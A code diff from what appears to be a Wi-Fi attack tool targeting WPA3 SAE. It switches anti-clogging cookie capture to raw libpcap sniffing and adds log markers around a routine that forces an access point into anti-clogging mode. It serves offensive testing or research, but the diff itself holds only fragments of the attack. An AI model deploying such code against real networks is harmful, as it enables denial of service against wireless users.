@@ -33,20 +33,28 @@ optional<ACMCookie> parse_acm_response(const vector<uint8_t> &packet){
 void capture_cookies(const string &sniff_iface, const HWAddress<6> &ap_mac, CookieStore &store){
 	const string filter = "wlan type mgt subtype auth and wlan addr2 " + ap_mac.to_string();
 
-	components::poll_sniffer_pdu<monostate>([&](const PDU &pdu) ->optional<monostate>{
-		if(store.stop.load()) return monostate{};
+	char errbuf[PCAP_ERRBUF_SIZE];
+	pcap_t *handle = pcap_open_live(sniff_iface.c_str(), 2000, 1, 100, errbuf);
+	if(!handle) throw run_err("pcap_open_live failed: " + string(errbuf));
+	pcap_setnonblock(handle, 1, errbuf);
+	auto guard = unique_ptr<pcap_t, void(*)(pcap_t *)>(handle, pcap_close);
 
-		const auto *raw_pdu = pdu.find_pdu<RawPDU>();
-		if(!raw_pdu) return nullopt;
+	bpf_program fp{};
+	if(pcap_compile(handle, &fp, filter.c_str(), 1, PCAP_NETMASK_UNKNOWN) == 0) pcap_setfilter(handle, &fp);
+	pcap_freecode(&fp);
 
-		if(auto entry = parse_acm_response(raw_pdu->payload())){
-			lock_guard lock(store.mtx);
-			const auto [it, inserted] = store.queue.insert_or_assign(entry->sta_mac, *entry);
-			if(inserted)
-				log(LogLevel::DEBUG, "Cookie captured for {}, queue size {}", entry->sta_mac, store.queue.size());
-		}
-		return nullopt;
-	}, sniff_iface, filter, nullopt);
+	components::poll_sniffer<monostate>(handle, nullopt,
+		[&](const uint8_t *packet, const uint32_t caplen) ->optional<monostate>{
+			if(store.stop.load()) return monostate{};
+
+			if(auto entry = parse_acm_response({packet, packet + caplen})){
+				lock_guard lock(store.mtx);
+				const auto [it, inserted] = store.queue.insert_or_assign(entry->sta_mac, *entry);
+				if(inserted)
+					log(LogLevel::DEBUG, "Cookie captured for {}, queue size {}", entry->sta_mac, store.queue.size());
+			}
+			return nullopt;
+		});
 
 	log(LogLevel::INFO, "Cookie capture stopped");
 }
@@ -137,7 +145,9 @@ void run_attack(RunStatus &rs){
 	att->set_iface_up();
 
 	//  force AP into ACM mode
+	rs.process_manager.write_log_all("@attack_stark");
 	trigger_acm(att.get(SK::iface), att.get(SK::mac), ap.get(SK::mac), trigger_count, sae_params.value());
+	rs.process_manager.write_log_all("@AKM_trigger");
 	rs.start_observers();
 	CookieStore store;
 	thread capture_thread([&](){
